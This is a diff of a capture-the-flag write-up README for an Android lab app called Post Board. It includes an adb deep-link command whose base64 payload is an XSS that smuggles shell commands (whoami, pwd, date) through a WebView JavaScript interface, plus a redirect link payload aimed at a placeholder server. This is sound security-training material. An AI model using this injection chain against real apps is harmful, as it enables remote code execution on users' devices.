@@ -1,6 +1,7 @@
 # Writeup for Post Board challenge.
 
 >here's how to use the scripts only as proof of concept.
+
 Check the full Writeup at my blog --> [Post Board](https://blog.parad0x.vip/blog/2024/10/01/PostBoard1.html)
 ---
 
@@ -24,6 +25,7 @@ adb shell am start -a android.intent.action.VIEW \
 -n com.mobilehackinglab.postboard/.MainActivity -d \ 
 "postboard://postmessage/PGltZyBzcmM9IngiIG9uZXJyb3I9IldlYkFwcEludGVyZmFjZS5wb3N0Q293c2F5TWVzc2FnZSgnTW9vb287d2hvYW1pO3B3ZDtkYXRlJykgIj4K"
 ```
+<img width="400" src="https://github.com/user-attachments/assets/6c95881a-fd1d-405b-893e-bcd023958e0d"/>
 
 
 ## Bonus XSS on Chrome Client 
@@ -31,10 +33,9 @@ Sending a malicious link to the application it's possible to redirect the victim
 
 Payload: `[Innocent Link](http://{YOUR_SERVER_IP:PORT}/)` 
 
-## Video
+<img weight="300" width="300" src="https://github.com/user-attachments/assets/b2be9b70-a5e5-46fc-b8c2-37b5a7d4653c"/>
 
-<div style="padding:51.56% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/1011473045?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479" frameborder="0" allow="autoplay; fullscreen; picture-in-picture; clipboard-write" style="position:absolute;top:0;left:0;width:100%;height:100%;" title="postboard"></iframe></div><script src="https://player.vimeo.com/api/player.js"></script>
 
 ## Conclusion
 
-On my blog, I'll cover step by step to achieve the RCE and exploit the XSS weakness.
+On my blog, I'll cover step by step to achieve the RCE and exploit the webview weakness.
